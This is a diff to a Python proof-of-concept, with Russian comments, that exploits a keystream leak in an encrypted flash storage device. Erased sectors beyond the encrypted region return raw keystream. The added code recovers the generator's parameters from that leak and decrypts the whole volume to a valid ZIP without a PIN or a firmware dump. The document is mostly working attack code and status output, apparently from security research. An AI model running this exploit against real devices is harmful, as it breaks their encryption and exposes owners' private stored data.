@@ -8,16 +8,22 @@ PoC для вектора attack5 — оракул гаммы из сектор�
     served(L) = 0xFF XOR keystream(L) = ~keystream(L)
 — то есть любой смонтировавший диск хост легально получает чистую гамму.
 
-Здесь модель проверяется по дампу: константы гаммы взяты из attack1
-(взгляд «атакующий с дампом прошивки»); чёрноящичный путь восстановления
-параметров без констант описан в README и здесь не реализуется.
+Модель утечки проверяется по дампу с вшитыми константами (эмуляция того, что
+отдаёт устройство: served = flash XOR keystream). Восстановление генератора из
+собранной гаммы (шаг 3 вектора) реализовано отдельно, движком из attack3, и НЕ
+использует вшитые константы — оно решает (A, seed, B, W) из одной лишь утечки и
+проверяется расшифровкой хранилища до валидного по CRC ZIP.
 
 Usage:
     python3 keystream_leak_demo.py backup_full.bin
 """
+import os
 import sys
 import math
 from collections import Counter
+
+sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "attack3"))
+import recover_keystream as R  # noqa: E402  (shared generator math, single source)
 
 STORAGE_OFF = 0x100000          # 0x10100000 - 0x10000000 (XIP base)
 STORAGE_LEN = 0xB0000           # 704 KiB шифрованной области
@@ -49,6 +55,35 @@ def entropy(buf):
     return -sum((v / n) * math.log2(v / n) for v in cnt.values())
 
 
+def recover_generator_from_leak(ks_by_lba, storage_ct):
+    """Recover (A, seed, B, W) from the slack-oracle keystream alone.
+
+    ks_by_lba maps a leaked LBA to its 512 keystream bytes (ks = 0xFF ^ served,
+    since the tail flash is erased). No firmware constant is read: B and W are
+    found in attack3's public-constant dictionary, A = 32*B, and seed by interval
+    intersection on Z/2**32 over the leaked bytes. The unique (A, seed, B, W) is
+    the one that decrypts the storage volume to a CRC-valid ZIP. Returns it or None.
+    """
+    sample = sorted(ks_by_lba)[:4]        # a few leaked sectors already pin seed
+    for B in R.FAMOUS:
+        A = (32 * B) & R.MASK
+        for W in R.FAMOUS:
+            cons = []
+            for lba in sample:
+                ks = ks_by_lba[lba]
+                for o in range(R.SEC):
+                    off = (lba * A + R.lane_offset(o, B, W)) & R.MASK
+                    cons.append((ks[o], off))
+            seeds = R._solve(cons)
+            if not seeds:
+                continue
+            for seed in seeds:
+                pt = R.decrypt_all(storage_ct, A, seed, B, W)
+                if R.strict_bootsector(pt[:R.SEC]) and R.volume_has_valid_zip(pt):
+                    return (A, seed, B, W)
+    return None
+
+
 def main(argv):
     if len(argv) < 2:
         print(__doc__)
@@ -67,6 +102,9 @@ def main(argv):
         if all(b == 0xFF for b in data[off:off + SECTOR]):
             first_ff = lba
             break
+    if first_ff is None:
+        print("[!] нет полностью стёртых секторов — дамп не похож на этот образ")
+        return 2
     slack_sectors = DISK_SECTORS - first_ff
     print(f"\n[1] первый полностью стёртый сектор флеша: LBA {first_ff} (0x{first_ff:x})")
     print(f"    LBA {first_ff}..{DISK_SECTORS - 1} лежат ВНЕ шифрованной области "
@@ -111,8 +149,35 @@ def main(argv):
                   f" зашифрованные нули (артефакт записи образа): served там = 0x00, в оракул не годятся")
     total = leaked * SECTOR
     print(f"    суммарно хост собирает ~{total} байт чистой гаммы одним последовательным чтением")
-    print(f"    (гамма покрывает LBA {first_ff}..0x7FF; по линейности генератора"
-          f" восстанавливается на весь диск — путь в README)")
+
+    # 4) шаг 3 вектора: восстановить генератор ИЗ утечки, без вшитых констант,
+    #    и доказать расшифровкой хранилища до валидного по CRC ZIP
+    print("\n[4] восстановление генератора из собранной гаммы (движок attack3, без констант прошивки):")
+    ks_by_lba = {}
+    for lba in range(first_ff, DISK_SECTORS):
+        off = STORAGE_OFF + lba * SECTOR
+        flash = data[off:off + SECTOR]
+        if all(b == 0xFF for b in flash):
+            served = bytes(c ^ k for c, k in zip(flash, ks_sector(lba)))  # что отдаёт устройство
+            ks_by_lba[lba] = bytes(0xFF ^ s for s in served)              # хвост стёрт => ks = 0xFF ^ served
+    storage_ct = data[STORAGE_OFF:STORAGE_OFF + STORAGE_LEN]
+    res = recover_generator_from_leak(ks_by_lba, storage_ct)
+    if res is None:
+        print("    FAIL — генератор не восстановлен из утечки")
+        return 1
+    A, seed, B, W = res
+    pt = R.decrypt_all(storage_ct, A, seed, B, W)
+    zf_ok = R.volume_has_valid_zip(pt)
+    print(f"    B    = 0x{B:08X}  ({'glibc rand()' if B == INC_BLK else 'словарь'})")
+    print(f"    W    = 0x{W:08X}  ({'golden-ratio Кнута' if W == 0x9E3779B1 else 'словарь'})")
+    print(f"    A    = 0x{A:08X}  (= 32*B, производный)")
+    print(f"    seed = 0x{seed:08X}  ({'точно совпал с прошивкой' if seed == SEED else 'член класса эквивалентности'})")
+    print(f"    сектор 0 -> {pt[:11].hex(' ')} ...  OEM={bytes(pt[3:11])!r}  boot sig={pt[510:512].hex(' ')}")
+    print(f"    валидный FAT12 boot: {R.strict_bootsector(pt[:SECTOR])};  CRC-валидный ZIP: {zf_ok}")
+    if not (R.strict_bootsector(pt[:SECTOR]) and zf_ok):
+        print("    FAIL — восстановленная гамма не расшифровала хранилище")
+        return 1
+    print("    OK — оракул за границей вскрывает весь том без дампа прошивки, без PIN, без реверса")
     return 0
 
 
